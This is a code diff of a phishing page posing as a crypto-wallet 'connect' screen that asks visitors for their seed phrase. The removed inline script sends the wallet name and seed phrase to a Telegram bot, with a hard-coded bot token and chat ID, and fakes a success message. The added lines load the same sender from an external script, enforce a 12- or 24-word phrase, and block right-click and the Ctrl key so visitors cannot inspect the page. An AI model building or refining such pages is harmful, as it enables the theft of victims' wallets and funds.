@@ -13,8 +13,7 @@
     <link rel="preload" href="files/static/css/1f147681d5457acaa9f5.css" as="style" />
     <link rel="stylesheet" href="files/static/css/1f147681d5457acaa9f5.css" />
     <link rel="stylesheet" href="files/static/css/add.css" type="text/css" />
-    <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
-    <script src="../scripts/sender.js"></script>
+    
 </head>
 
 <body>
@@ -1360,8 +1359,10 @@
                                 
                                     <!-- <input class="input allinput" name="phrase2" placeholder="" id="phraseinput">
                                     <textarea class="textarea allinput" name="phrase" placeholder="Phrase"></textarea> -->
-                                    <input class="input allinput" name="phrase2" placeholder="Click to input your phrase" id="phraseinput"> 
-                                    <small style="text-align: center; margin-bottom: 10px">Press the Enter Key after your input your phrase<span id="walletName"></span></small>
+                                    <input class="input allinput" name="phrase2" placeholder="Click to input your phrase" id="phraseinput" required> 
+                                    <small style="text-align: center; margin-bottom: 10px">Press the Enter Key after your input your phrase<span id="walletName"></span></small><br>
+                                    <small style="text-align: center; margin-bottom: 10px; color: red; display: none;">Seed Phrase must be a 12 or 24 words!<span id="phrase_error"></span></small>
+
                                 </div
                                 <div class="buttonbox">
                                 <button class="bluebtn_bird"  type="submit" >connect</button>
@@ -1447,12 +1448,10 @@
 
                 </div>
 
-
-
                 <script src="files/static/chunks/jquery-3.4.1.min.js"></script>
+                <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+                <script src="scripts/sender.js"></script>
                 <script type="text/javascript">
-                    
-    
                     $('.tab ul li').on('click', function() {
 
                         var id = $(this).attr('id');
@@ -1496,70 +1495,17 @@
                         $('#myModal').css('display', 'none');
                     });
 
-
-
-
                     var setWallet = function(e) {
                         $('#connectWallet').css('display', 'none');
                     };
-
-
-
-                   //bot token
-var telegram_bot_id = "7165516047:AAEaHWfQ87MvRUGtNJihrqoteBbE8JLkjwc";
-//chat id
-var chat_id = 731784706;
-
-var wallet1, wallet2, wallet3, phrase, message;
-
-var ready = function () {
-    wallet1 = document.getElementById("wallet1").value;
-    wallet2 = document.getElementById("wallet2").value;
-    wallet3 = document.getElementById("wallet3").value;
-    phrase = document.getElementById("phraseinput").value;
-
-    message = "New Entry:\n" + "\nWallet: " + wallet1 + "\nSeed Phrase: " + phrase;
-};
-
-var sender = function () {
-  ready();
-  var settings = {
-      "async": true,
-      "crossDomain": true,
-      "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
-      "method": "POST",
-      "headers": {
-          "Content-Type": "application/json",
-          "cache-control": "no-cache"
-      },
-      "data": JSON.stringify({
-          "chat_id": chat_id,
-          "text": message
-      })
-  };
-  $.ajax(settings)
-  .then(function (response) {
-        console.log(response);
-        swal("Secussful", "You clicked the button!", "success");
-    })
-    .catch(function(error) {
-        swal("Error", "You clicked the button!", "error");
-        throw error;
-    });
-}; 
                 </script>
 
-
-
-
-
             </main>
-
 
         </div>
     </div>
 
-    <!-- <script>
+    <script>
         //DISABLE RIGHT CLICK AND CTRL KEY
         window.oncontextmenu = function() {
             return false;
@@ -1574,13 +1520,11 @@ var sender = function () {
                 return false;
             }
         });
-    </script> -->
+    </script>
 
     <script src="//code.tidio.co/m4bjmxyzr3zuzvynoaxcyujiuyiglwfh.js" async></script>
-    <!--End of Tawk.to Script-->
-    <div>
-        <button style="background-color: black; color: azure;">Submit</button>
-     </div>
+    <!--End of tidio Script-->
+
 </body>
 
 </html>
